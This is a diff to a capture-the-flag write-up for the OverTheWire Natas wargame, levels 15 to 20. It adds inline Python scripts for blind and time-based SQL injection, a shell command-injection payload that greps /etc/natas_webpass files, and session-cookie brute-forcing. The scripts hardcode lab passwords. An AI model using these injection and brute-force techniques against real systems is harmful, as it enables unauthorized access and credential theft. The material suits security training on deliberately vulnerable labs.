@@ -120,10 +120,38 @@ if(array_key_exists("username", $_REQUEST)) {
 ```
 2. Step 2 - You can see that we can just know **if the user exists** and cannot get the password directly. Therefore, we have to `brute-force` it.
 3. Step 3 - Based on the idea, you can try add the `username: natas16" OR "1" = "1` we can get `This user exists.`.
-4. Step 4 - Use the `python` code that I created to **brute-force** the password. [Python code](../code/natas/level_15_to_16.py)
+4. Step 4 - Use the `python` code that I created to **brute-force** the password.
+```python
+import requests
+import string
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx") # Change the password if needed
+
+charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
+
+found = ""
+
+# Brute-force the password
+print('Start brute-forcing!!')
+for i in range(1, 33): 
+    for ch in charset:
+        payload = f'natas16" AND password LIKE BINARY "{found + ch}%" -- '
+
+        # Send request
+        res = requests.post(url, data={"username": payload}, auth=auth)
+
+        # Check response
+        if "This user exists." in res.text:
+            found += ch
+            print(f"[+] Found so far: {found}")
+            break
+
+print(f"\n[✅] Final password for natas16: {found}")
+```
 - Running the code you will get the result:
 
-![Screenshot image](../screenshots/natas_level_15_to_16.png)
+![Screenshot image](/images/posts/natas_level_15_to_16.png)
 
 5. Step 5 - Take the password to the next level.
 
@@ -165,12 +193,34 @@ if($key != "") {
 ```
 **Now it has restricted more characters that require us to brute-force in order to get the password**
 
-2. Step 2 - Use my `python` code in order to the correct password: [Python code](../code/natas/level_16_to_17.py)
+2. Step 2 - Use my `python` code in order to the correct password:
+```python
+import requests
+import string
+
+url = "http://natas16.natas.labs.overthewire.org/"
+auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")  # Replace with your real password
+
+charset = string.ascii_letters + string.digits
+
+found = ""
+print('Start brute-forcing!!')
+for i in range(1, 33):
+    for ch in charset:
+        payload = f'$(grep ^{found + ch} /etc/natas_webpass/natas17)'
+        res = requests.get(url, params={"needle": payload + "anything"}, auth=auth)
+        if "anything" not in res.text:
+            found += ch
+            print(f"[+] Found so far: {found}")
+            break
+
+print(f"[✅] Final password for natas17: {found}")
+```
 - Idea: `grep ^guess /etc/natas_webpass_natas17` to guess the password through each characters until get the result
 
 3. Step 3 - Run the `python` code to brute-force `natas17` password:
 
-![Screenshot image](../screenshots/natas_level_16_to_17.png)
+![Screenshot image](/images/posts/natas_level_16_to_17.png)
 
 4. Step 4 - Take the password to the next level.
 
@@ -229,12 +279,34 @@ if(array_key_exists("username", $_REQUEST)) {
 ```
 **Now it doesn't have any messages for us to know if we get the correct character.**
 
-2. Step 2 - Use my `python` code in order to the correct password: [Python code](../code/natas/level_17_to_18.py).
+2. Step 2 - Use my `python` code in order to the correct password:
+```python
+import requests, string
+
+url = "http://natas17.natas.labs.overthewire.org/"
+auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
+
+charset = string.ascii_letters + string.digits # a-z, A-Z, 0-9
+
+found = ""
+for pos in range(1, 33):
+    for ch in charset:
+        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP(5), 0) -- -'
+        r = requests.post(url, data={"username": payload}, auth=auth)
+        if (r.elapsed.total_seconds() > 5):
+            found += ch
+            print(f"[+] Found so far: {found}")
+            break
+    else:
+        raise SystemExit(f"No match at position {pos}, try a larger SLEEP or lower threshold.")
+
+print(f"\n[✅] Final password for natas18: {found}")
+```
 - Idea: `sleep(5)` when find the correct character and check `r.elapsed.total_seconds() > 5` in order to get that character.
 
 3. Step 3 - Run the `python` code to brute-force `natas18` password:
 
-![Screenshot image](../screenshots/natas_level_17_to_18.png)
+![Screenshot image](/images/posts/natas_level_17_to_18.png)
 
 4. Step 4 - Take the password to the next level.
 
@@ -281,9 +353,28 @@ function my_session_start() { /* {{{ */
 **We can see that the authentication based on the `PHPSESSID` to determine if it is the admin.**
 
 2. Step 2 - We have to create a `python` code to make requests with different `PHPSESSID` to the `natas18` in order to get the admin account.
-3. Step 3 - Use my `python` code in order to get the admin PHPSESSID: [Python code](../code/natas/level_18_to_19.py)
+3. Step 3 - Use my `python` code in order to get the admin PHPSESSID:
+```python
+import requests
 
-![Screenshot image](../screenshots/natas_level_18_to_19.png)
+url = "http://natas18.natas.labs.overthewire.org/index.php"
+auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
+
+max_id = 640
+
+for i in range(0, max_id + 1):
+    cookie = f"PHPSESSID={str(i)}"
+
+    headers = {'Cookie': cookie}
+
+    print(f'[+] Getting {cookie}')
+    response = requests.get(url, headers=headers, auth=auth)
+
+    if "You are logged in as a regular user" not in response.text:
+        print(f"\n[✅] Admin PHPSESSID is: {i}")
+        break
+```
+![Screenshot image](/images/posts/natas_level_18_to_19.png)
 
 4. Step 4 - Use `PHPSESSID = 119` to the `cookie` of the browser to get the password.
 5. Step 5 - Take the password to the next level.
@@ -313,9 +404,34 @@ Level url: [http://natas19.natas.labs.overthewire.org/](http://natas19.natas.lab
 
 **We can see that the ID has format `id-username` so now we can try different `ids` with `admin`**
 
-5. Step 5 - Use the my `python` code to brute-force the `ids` and get the correct `hex_data`. [Python code](../code/natas/level_19_to_20.py)
+5. Step 5 - Use the my `python` code to brute-force the `ids` and get the correct `hex_data`.
+```python
+import requests
 
-![Screenshot image](../screenshots/natas_level_19_to_20.png)
+url = "http://natas19.natas.labs.overthewire.org/index.php"
+auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
+
+max_id = 640
+
+for i in range(0, max_id + 1):
+    value = f"{i}-admin"
+    bytes_data = value.encode('utf-8')
+    # Convert the bytes to a hexadecimal string
+    hex_data = bytes_data.hex()
+    
+    cookie = f"PHPSESSID={hex_data}"
+
+    headers = {'Cookie': cookie}
+
+    print(f'[+] Getting {value}')
+    response = requests.get(url, headers=headers, auth=auth)
+
+    if "You are logged in as a regular user" not in response.text:
+        print(f"\n[✅] Admin PHPSESSID is: {value} / Hex Data: {hex_data}")
+        break
+```
+
+![Screenshot image](/images/posts/natas_level_19_to_20.png)
 
 6. Step 6 - Take the correct admin `hex_data` and change the cookie value in browser in order to get the password.
 7. Step 7 - Take the password to the next level.
